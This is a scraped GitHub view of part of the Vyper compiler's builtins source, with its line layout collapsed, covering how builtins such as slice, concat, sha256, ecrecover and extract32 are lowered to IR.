 @process\_inputs def build\_IR(self, expr, args, kwargs, context): arg = args[0] with arg.cache\_when\_complex("arg") as (b1, arg): ret = IRnode.from\_list( [ "if", ["slt", arg, 0], ["sdiv", arg, DECIMAL\_DIVISOR], ["sdiv", ["add", arg, DECIMAL\_DIVISOR - 1], DECIMAL\_DIVISOR], ], typ=INT256\_T, ) return b1.resolve(ret)
class Convert(BuiltinFunction): \_id = "convert"
 def fetch\_call\_return(self, node): \_, target\_typedef = self.infer\_arg\_types(node)
 # note: more type conversion validation happens in convert.py return target\_typedef.typedef
 # TODO: push this down into convert.py for more consistency def infer\_arg\_types(self, node): validate\_call\_args(node, 2)
 target\_type = type\_from\_annotation(node.args[1]) value\_types = get\_possible\_types\_from\_node(node.args[0])
 # For `convert` of integer literals, we need to match type inference rules in # convert.py codegen routines. # TODO: This can probably be removed once constant folding for `convert` is implemented if len(value\_types) > 1 and all(isinstance(v, IntegerT) for v in value\_types): # Get the smallest (and unsigned if available) type for non-integer target types # (note this is different from the ordering returned by `get\_possible\_types\_from\_node`) if not isinstance(target\_type, IntegerT): value\_types = sorted(value\_types, key=lambda v: (v.is\_signed, v.bits), reverse=True) else: # filter out the target type from list of possible types value\_types = [i for i in value\_types if not target\_type.compare\_type(i)]
 value\_type = value\_types.pop()
 # block conversions between same type if target\_type.compare\_type(value\_type): raise InvalidType(f"Value and target type are both '{target\_type}'", node)
 return [value\_type, TYPE\_T(target\_type)]
 def build\_IR(self, expr, context): return convert(expr, context)
ADHOC\_SLICE\_NODE\_MACROS = ["~calldata", "~selfcode", "~extcode"]
def \_build\_adhoc\_slice\_node(sub: IRnode, start: IRnode, length: IRnode, context: Context) -> IRnode: assert length.is\_literal, "typechecker failed" assert isinstance(length.value, int) # mypy hint
 dst\_typ = BytesT(length.value) # allocate a buffer for the return value np = context.new\_internal\_variable(dst\_typ)
 # `msg.data` by `calldatacopy` if sub.value == "~calldata": node = [ "seq", ["assert", ["le", ["add", start, length], "calldatasize"]], # runtime bounds check ["mstore", np, length], ["calldatacopy", np + 32, start, length], np, ]
 # `self.code` by `codecopy` elif sub.value == "~selfcode": node = [ "seq", ["assert", ["le", ["add", start, length], "codesize"]], # runtime bounds check ["mstore", np, length], ["codecopy", np + 32, start, length], np, ]
 # `<address>.code` by `extcodecopy` else: assert sub.value == "~extcode" and len(sub.args) == 1 node = [ "with", "\_extcode\_address", sub.args[0], [ "seq", # runtime bounds check ["assert", ["le", ["add", start, length], ["extcodesize", "\_extcode\_address"]]], ["mstore", np, length], ["extcodecopy", "\_extcode\_address", np + 32, start, length], np, ], ]
 assert isinstance(length.value, int) # mypy hint return IRnode.from\_list(node, typ=BytesT(length.value), location=MEMORY)
# note: this and a lot of other builtins could be refactored to accept any uint typeclass Slice(BuiltinFunction): \_id = "slice" \_inputs = [ ("b", (BYTES32\_T, BytesT.any(), StringT.any())), ("start", UINT256\_T), ("length", UINT256\_T), ] \_return\_type = None
 def fetch\_call\_return(self, node): arg\_type, \_, \_ = self.infer\_arg\_types(node)
 if isinstance(arg\_type, StringT): return\_type = StringT() else: return\_type = BytesT()
 # validate start and length are in bounds
 arg = node.args[0] start\_expr = node.args[1] length\_expr = node.args[2]
 # CMC 2022-03-22 NOTE slight code duplication with semantics/analysis/local is\_adhoc\_slice = arg.get("attr") == "code" or ( arg.get("value.id") == "msg" and arg.get("attr") == "data" )
 start\_literal = start\_expr.value if isinstance(start\_expr, vy\_ast.Int) else None length\_literal = length\_expr.value if isinstance(length\_expr, vy\_ast.Int) else None
 if not is\_adhoc\_slice: if length\_literal is not None: if length\_literal < 1: raise ArgumentException("Length cannot be less than 1", length\_expr)
 if length\_literal > arg\_type.length: raise ArgumentException(f"slice out of bounds for {arg\_type}", length\_expr)
 if start\_literal is not None: if start\_literal > arg\_type.length: raise ArgumentException(f"slice out of bounds for {arg\_type}", start\_expr) if length\_literal is not None and start\_literal + length\_literal > arg\_type.length: raise ArgumentException(f"slice out of bounds for {arg\_type}", node)
 # we know the length statically if length\_literal is not None: return\_type.set\_length(length\_literal) else: return\_type.set\_min\_length(arg\_type.length)
 return return\_type
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) # return a concrete type for `b` b\_type = get\_possible\_types\_from\_node(node.args[0]).pop() return [b\_type, self.\_inputs[1][1], self.\_inputs[2][1]]
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): src, start, length = args
 # Handle `msg.data`, `self.code`, and `<address>.code` if src.value in ADHOC\_SLICE\_NODE\_MACROS: return \_build\_adhoc\_slice\_node(src, start, length, context)
 is\_bytes32 = src.typ == BYTES32\_T if src.location is None: # it's not a pointer; force it to be one since # copy\_bytes works on pointers. assert is\_bytes32, src src = ensure\_in\_memory(src, context)
 with src.cache\_when\_complex("src") as (b1, src), start.cache\_when\_complex("start") as ( b2, start, ), length.cache\_when\_complex("length") as (b3, length): if is\_bytes32: src\_maxlen = 32 else: src\_maxlen = src.typ.maxlen
 dst\_maxlen = length.value if length.is\_literal else src\_maxlen
 buflen = dst\_maxlen
 # add 32 bytes to the buffer size bc word access might # be unaligned (see below) if src.location == STORAGE: buflen += 32
 # Get returntype string or bytes assert isinstance(src.typ, \_BytestringT) or is\_bytes32 # TODO: try to get dst\_typ from semantic analysis if isinstance(src.typ, StringT): dst\_typ = StringT(dst\_maxlen) else: dst\_typ = BytesT(dst\_maxlen)
 # allocate a buffer for the return value buf = context.new\_internal\_variable(BytesT(buflen)) # assign it the correct return type. # (note mismatch between dst\_maxlen and buflen) dst = IRnode.from\_list(buf, typ=dst\_typ, location=MEMORY)
 dst\_data = bytes\_data\_ptr(dst)
 if is\_bytes32: src\_len = 32 src\_data = src else: src\_len = get\_bytearray\_length(src) src\_data = bytes\_data\_ptr(src)
 # general case. byte-for-byte copy if src.location == STORAGE: # because slice uses byte-addressing but storage # is word-aligned, this algorithm starts at some number # of bytes before the data section starts, and might copy # an extra word. the pseudocode is: # dst\_data = dst + 32 # copy\_dst = dst\_data - start % 32 # src\_data = src + 32 # copy\_src = src\_data + (start - start % 32) / 32 # = src\_data + (start // 32) # copy\_bytes(copy\_dst, copy\_src, length) # //set length AFTER copy because the length word has been clobbered! # mstore(src, length)
 # start at the first word-aligned address before `start` # e.g. start == byte 7 -> we start copying from byte 0 # start == byte 32 -> we start copying from byte 32 copy\_src = IRnode.from\_list( ["add", src\_data, ["div", start, 32]], location=src.location )
 # e.g. start == byte 0 -> we copy to dst\_data + 0 # start == byte 7 -> we copy to dst\_data - 7 # start == byte 33 -> we copy to dst\_data - 1 copy\_dst = IRnode.from\_list( ["sub", dst\_data, ["mod", start, 32]], location=dst.location )
 # len + (32 if start % 32 > 0 else 0) copy\_len = ["add", length, ["mul", 32, ["iszero", ["iszero", ["mod", start, 32]]]]] copy\_maxlen = buflen
 else: # all other address spaces (mem, calldata, code) we have # byte-aligned access so we can just do the easy thing, # memcopy(dst\_data, src\_data + dst\_data)
 copy\_src = add\_ofst(src\_data, start) copy\_dst = dst\_data copy\_len = length copy\_maxlen = buflen
 do\_copy = copy\_bytes(copy\_dst, copy\_src, copy\_len, copy\_maxlen)
 ret = [ "seq", # make sure we don't overrun the source buffer ["assert", ["le", ["add", start, length], src\_len]], # bounds check do\_copy, ["mstore", dst, length], # set length dst, # return pointer to dst ] ret = IRnode.from\_list(ret, typ=dst\_typ, location=MEMORY) return b1.resolve(b2.resolve(b3.resolve(ret)))
class Len(BuiltinFunction): \_id = "len" \_inputs = [("b", (StringT.any(), BytesT.any(), DArrayT.any()))] \_return\_type = UINT256\_T
 def evaluate(self, node): validate\_call\_args(node, 1) arg = node.args[0] if isinstance(arg, (vy\_ast.Str, vy\_ast.Bytes)): length = len(arg.value) elif isinstance(arg, vy\_ast.Hex): # 2 characters represent 1 byte and we subtract 1 to ignore the leading `0x` length = len(arg.value) // 2 - 1 else: raise UnfoldableNode
 return vy\_ast.Int.from\_node(node, value=length)
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) # return a concrete type typ = get\_possible\_types\_from\_node(node.args[0]).pop() return [typ]
 def build\_IR(self, node, context): arg = Expr(node.args[0], context).ir\_node if arg.value == "~calldata": return IRnode.from\_list(["calldatasize"], typ=UINT256\_T) return get\_bytearray\_length(arg)
class Concat(BuiltinFunction): \_id = "concat"
 def fetch\_call\_return(self, node): arg\_types = self.infer\_arg\_types(node)
 length = 0 for arg\_t in arg\_types: length += arg\_t.length
 if isinstance(arg\_types[0], (StringT)): return\_type = StringT() else: return\_type = BytesT() return\_type.set\_length(length) return return\_type
 def infer\_arg\_types(self, node): if len(node.args) < 2: raise ArgumentException("Invalid argument count: expected at least 2", node)
 if node.keywords: raise ArgumentException("Keyword arguments are not accepted here", node.keywords[0])
 ret = [] prev\_typeclass = None for arg in node.args: validate\_expected\_type(arg, (BytesT.any(), StringT.any(), BytesM\_T.any())) arg\_t = get\_possible\_types\_from\_node(arg).pop() current\_typeclass = "String" if isinstance(arg\_t, StringT) else "Bytes" if prev\_typeclass and current\_typeclass != prev\_typeclass: raise TypeMismatch( ( "Concat expects consistent use of string or bytes types, " "use either string or bytes." ), arg, ) prev\_typeclass = current\_typeclass ret.append(arg\_t)
 return ret
 def build\_IR(self, expr, context): args = [Expr(arg, context).ir\_node for arg in expr.args] if len(args) < 2: raise StructureException("Concat expects at least two arguments", expr)
 # Maximum length of the output dst\_maxlen = sum( [arg.typ.maxlen if isinstance(arg.typ, \_BytestringT) else arg.typ.m for arg in args] )
 # TODO: try to grab these from semantic analysis if isinstance(args[0].typ, StringT): ret\_typ = StringT(dst\_maxlen) else: ret\_typ = BytesT(dst\_maxlen)
 # Node representing the position of the output in memory dst = IRnode.from\_list( context.new\_internal\_variable(ret\_typ), typ=ret\_typ, location=MEMORY, annotation="concat destination", )
 ret = ["seq"] # stack item representing our current offset in the dst buffer ofst = "concat\_ofst"
 # TODO: optimize for the case where all lengths are statically known. for arg in args: dst\_data = add\_ofst(bytes\_data\_ptr(dst), ofst)
 if isinstance(arg.typ, \_BytestringT): # Ignore empty strings if arg.typ.maxlen == 0: continue
 with arg.cache\_when\_complex("arg") as (b1, arg): argdata = bytes\_data\_ptr(arg)
 with get\_bytearray\_length(arg).cache\_when\_complex("len") as (b2, arglen): do\_copy = [ "seq", copy\_bytes(dst\_data, argdata, arglen, arg.typ.maxlen), ["set", ofst, ["add", ofst, arglen]], ] ret.append(b1.resolve(b2.resolve(do\_copy)))
 else: ret.append(STORE(dst\_data, unwrap\_location(arg))) ret.append(["set", ofst, ["add", ofst, arg.typ.m]])
 ret.append(STORE(dst, ofst))
 # Memory location of the output ret.append(dst)
 return IRnode.from\_list( ["with", ofst, 0, ret], typ=ret\_typ, location=MEMORY, annotation="concat" )
class Keccak256(BuiltinFunction): \_id = "keccak256" # TODO allow any BytesM\_T \_inputs = [("value", (BytesT.any(), BYTES32\_T, StringT.any()))] \_return\_type = BYTES32\_T
 def evaluate(self, node): validate\_call\_args(node, 1) if isinstance(node.args[0], vy\_ast.Bytes): value = node.args[0].value elif isinstance(node.args[0], vy\_ast.Str): value = node.args[0].value.encode() elif isinstance(node.args[0], vy\_ast.Hex): length = len(node.args[0].value) // 2 - 1 value = int(node.args[0].value, 16).to\_bytes(length, "big") else: raise UnfoldableNode
 hash\_ = f"0x{keccak256(value).hex()}" return vy\_ast.Hex.from\_node(node, value=hash\_)
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) # return a concrete type for `value` value\_type = get\_possible\_types\_from\_node(node.args[0]).pop() return [value\_type]
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): assert len(args) == 1 return keccak256\_helper(args[0], context)
def \_make\_sha256\_call(inp\_start, inp\_len, out\_start, out\_len): return [ "assert", [ "staticcall", ["gas"], # gas SHA256\_ADDRESS, # address inp\_start, inp\_len, out\_start, out\_len, ], ]
class Sha256(BuiltinFunction): \_id = "sha256" \_inputs = [("value", (BYTES32\_T, BytesT.any(), StringT.any()))] \_return\_type = BYTES32\_T
 def evaluate(self, node): validate\_call\_args(node, 1) if isinstance(node.args[0], vy\_ast.Bytes): value = node.args[0].value elif isinstance(node.args[0], vy\_ast.Str): value = node.args[0].value.encode() elif isinstance(node.args[0], vy\_ast.Hex): length = len(node.args[0].value) // 2 - 1 value = int(node.args[0].value, 16).to\_bytes(length, "big") else: raise UnfoldableNode
 hash\_ = f"0x{hashlib.sha256(value).hexdigest()}" return vy\_ast.Hex.from\_node(node, value=hash\_)
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) # return a concrete type for `value` value\_type = get\_possible\_types\_from\_node(node.args[0]).pop() return [value\_type]
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): sub = args[0] # bytes32 input if sub.typ == BYTES32\_T: return IRnode.from\_list( [ "seq", ["mstore", MemoryPositions.FREE\_VAR\_SPACE, sub], \_make\_sha256\_call( inp\_start=MemoryPositions.FREE\_VAR\_SPACE, inp\_len=32, out\_start=MemoryPositions.FREE\_VAR\_SPACE, out\_len=32, ), ["mload", MemoryPositions.FREE\_VAR\_SPACE], # push value onto stack ], typ=BYTES32\_T, add\_gas\_estimate=SHA256\_BASE\_GAS + 1 \* SHA256\_PER\_WORD\_GAS, ) # bytearay-like input # special case if it's already in memory sub = ensure\_in\_memory(sub, context)
 return IRnode.from\_list( [ "with", "\_sub", sub, [ "seq", \_make\_sha256\_call( # TODO use add\_ofst if sub is statically known inp\_start=["add", "\_sub", 32], inp\_len=["mload", "\_sub"], out\_start=MemoryPositions.FREE\_VAR\_SPACE, out\_len=32, ), ["mload", MemoryPositions.FREE\_VAR\_SPACE], ], ], typ=BYTES32\_T, add\_gas\_estimate=SHA256\_BASE\_GAS + sub.typ.maxlen \* SHA256\_PER\_WORD\_GAS, )
class MethodID(FoldedFunction): \_id = "method\_id"
 def evaluate(self, node): validate\_call\_args(node, 1, ["output\_type"])
 args = node.args if not isinstance(args[0], vy\_ast.Str): raise InvalidType("method id must be given as a literal string", args[0]) if " " in args[0].value: raise InvalidLiteral("Invalid function signature - no spaces allowed.")
 return\_type = self.infer\_kwarg\_types(node) value = method\_id\_int(args[0].value)
 if return\_type.compare\_type(BYTES4\_T): return vy\_ast.Hex.from\_node(node, value=hex(value)) else: return vy\_ast.Bytes.from\_node(node, value=value.to\_bytes(4, "big"))
 def fetch\_call\_return(self, node): validate\_call\_args(node, 1, ["output\_type"])
 type\_ = self.infer\_kwarg\_types(node) return type\_
 def infer\_kwarg\_types(self, node): if node.keywords: return\_type = type\_from\_annotation(node.keywords[0].value) if return\_type.compare\_type(BYTES4\_T): return BYTES4\_T elif isinstance(return\_type, BytesT) and return\_type.length == 4: return BytesT(4) else: raise ArgumentException("output\_type must be Bytes[4] or bytes4", node.keywords[0])
 # If `output\_type` is not given, default to `Bytes[4]` return BytesT(4)
class ECRecover(BuiltinFunction): \_id = "ecrecover" \_inputs = [ ("hash", BYTES32\_T), ("v", (UINT256\_T, UINT8\_T)), ("r", (UINT256\_T, BYTES32\_T)), ("s", (UINT256\_T, BYTES32\_T)), ] \_return\_type = AddressT()
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) v\_t, r\_t, s\_t = [get\_possible\_types\_from\_node(arg).pop() for arg in node.args[1:]] return [BYTES32\_T, v\_t, r\_t, s\_t]
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): input\_buf = context.new\_internal\_variable(get\_type\_for\_exact\_size(128)) output\_buf = context.new\_internal\_variable(get\_type\_for\_exact\_size(32)) return IRnode.from\_list( [ "seq", # clear output memory first, ecrecover can return 0 bytes ["mstore", output\_buf, 0], ["mstore", input\_buf, args[0]], ["mstore", input\_buf + 32, args[1]], ["mstore", input\_buf + 64, args[2]], ["mstore", input\_buf + 96, args[3]], ["staticcall", "gas", 1, input\_buf, 128, output\_buf, 32], ["mload", output\_buf], ], typ=AddressT(), )
class \_ECArith(BuiltinFunction): @process\_inputs def build\_IR(self, expr, \_args, kwargs, context): args\_tuple = ir\_tuple\_from\_args(\_args)
 args\_t = args\_tuple.typ input\_buf = IRnode.from\_list( context.new\_internal\_variable(args\_t), typ=args\_t, location=MEMORY ) ret\_t = self.\_return\_type
 ret = ["seq"] ret.append(make\_setter(input\_buf, args\_tuple))
 output\_buf = context.new\_internal\_variable(ret\_t)
 args\_ofst = input\_buf args\_len = args\_t.memory\_bytes\_required out\_ofst = output\_buf out\_len = ret\_t.memory\_bytes\_required
 ret.append( [ "assert", ["staticcall", ["gas"], self.\_precompile, args\_ofst, args\_len, out\_ofst, out\_len], ] ) ret.append(output\_buf)
 return IRnode.from\_list(ret, typ=ret\_t, location=MEMORY)
class ECAdd(\_ECArith): \_id = "ecadd" \_inputs = [("a", SArrayT(UINT256\_T, 2)), ("b", SArrayT(UINT256\_T, 2))] \_return\_type = SArrayT(UINT256\_T, 2) \_precompile = 0x6
class ECMul(\_ECArith): \_id = "ecmul" \_inputs = [("point", SArrayT(UINT256\_T, 2)), ("scalar", UINT256\_T)] \_return\_type = SArrayT(UINT256\_T, 2) \_precompile = 0x7
def \_generic\_element\_getter(op): def f(index): return IRnode.from\_list( [op, ["add", "\_sub", ["add", 32, ["mul", 32, index]]]], typ=INT128\_T )
 return f
def \_storage\_element\_getter(index): return IRnode.from\_list(["sload", ["add", "\_sub", ["add", 1, index]]], typ=INT128\_T)
class Extract32(BuiltinFunction): \_id = "extract32" \_inputs = [("b", BytesT.any()), ("start", IntegerT.unsigneds())] # "TYPE\_DEFINITION" is a placeholder value for a type definition string, and # will be replaced by a `TYPE\_T` object in `infer\_kwarg\_types` # (note that it is ignored in \_validate\_arg\_types) \_kwargs = {"output\_type": KwargSettings("TYPE\_DEFINITION", BYTES32\_T)} \_return\_type = None
 def fetch\_call\_return(self, node): self.\_validate\_arg\_types(node) return\_type = self.infer\_kwarg\_types(node)["output\_type"].typedef return return\_type
 def infer\_arg\_types(self, node): self.\_validate\_arg\_types(node) input\_type = get\_possible\_types\_from\_node(node.args[0]).pop() return [input\_type, UINT256\_T]
 def infer\_kwarg\_types(self, node): if node.keywords: output\_type = type\_from\_annotation(node.keywords[0].value) if not isinstance(output\_type, (AddressT, BytesM\_T, IntegerT)): raise InvalidType( "Output type must be one of integer, bytes32 or address", node.keywords[0].value ) output\_typedef = TYPE\_T(output\_type) node.keywords[0].value.\_metadata["type"] = output\_typedef else: output\_typedef = TYPE\_T(BYTES32\_T)
 return {"output\_type": output\_typedef}
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): sub, index = args ret\_type = kwargs["output\_type"]
 # Get length and specific element if sub.location == STORAGE: lengetter = IRnode.from\_list(["sload", "\_sub"], typ=INT128\_T) elementgetter = \_storage\_element\_getter
 else: op = sub.location.load\_op lengetter = IRnode.from\_list([op, "\_sub"], typ=INT128\_T) elementgetter = \_generic\_element\_getter(op)
 # TODO rewrite all this with cache\_when\_complex and bitshifts
 # Special case: index known to be a multiple of 32 if isinstance(index.value, int) and not index.value % 32: o = IRnode.from\_list( [ "with", "\_sub", sub, elementgetter( ["div", clamp2(0, index, ["sub", lengetter, 32], signed=True), 32] ), ], typ=ret\_type, annotation="extracting 32 bytes", ) # General case else: o = IRnode.from\_list( [ "with", "\_sub", sub, [ "with", "\_len", lengetter, [ "with", "\_index", clamp2(0, index, ["sub", "\_len", 32], signed=True), [ "with", "\_mi32", ["mod", "\_index", 32], [ "with", "\_di32", ["div", "\_index", 32], [ "if", "\_mi32", [ "add", ["mul", elementgetter("\_di32"), ["exp", 256, "\_mi32"]], [ "div", elementgetter(["add", "\_di32", 1]), ["exp", 256, ["sub", 32, "\_mi32"]], ], ], elementgetter("\_di32"), ], ], ], ], ], ], typ=ret\_type, annotation="extract32", ) return IRnode.from\_list(clamp\_basetype(o), typ=ret\_type)
class AsWeiValue(BuiltinFunction): \_id = "as\_wei\_value" \_inputs = [("value", (IntegerT.any(), DecimalT())), ("unit", StringT.any())] \_return\_type = UINT256\_T
 wei\_denoms = { ("wei",): 1, ("femtoether", "kwei", "babbage"): 10\*\*3, ("picoether", "mwei", "lovelace"): 10\*\*6, ("nanoether", "gwei", "shannon"): 10\*\*9, ("microether", "szabo"): 10\*\*12, ("milliether", "finney"): 10\*\*15, ("ether",): 10\*\*18, ("kether", "grand"): 10\*\*21, }
 def get\_denomination(self, node): if not isinstance(node.args[1], vy\_ast.Str): raise ArgumentException( "Wei denomination must be given as a literal string", node.args[1] ) try: denom = next(v for k, v in self.wei\_denoms.items() if node.args[1].value in k) except StopIteration: raise ArgumentException( f"Unknown denomination: {node.args[1].value}", node.args[1] ) from None
 return denom
 def evaluate(self, node): validate\_call\_args(node, 2) denom = self.get\_denomination(node)
 if not isinstance(node.args[0], (vy\_ast.Decimal, vy\_ast.Int)): raise UnfoldableNode value = node.args[0].value
 if value < 0:[View remainder of file in raw view](https://github.com/vyperlang/vyper/raw/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


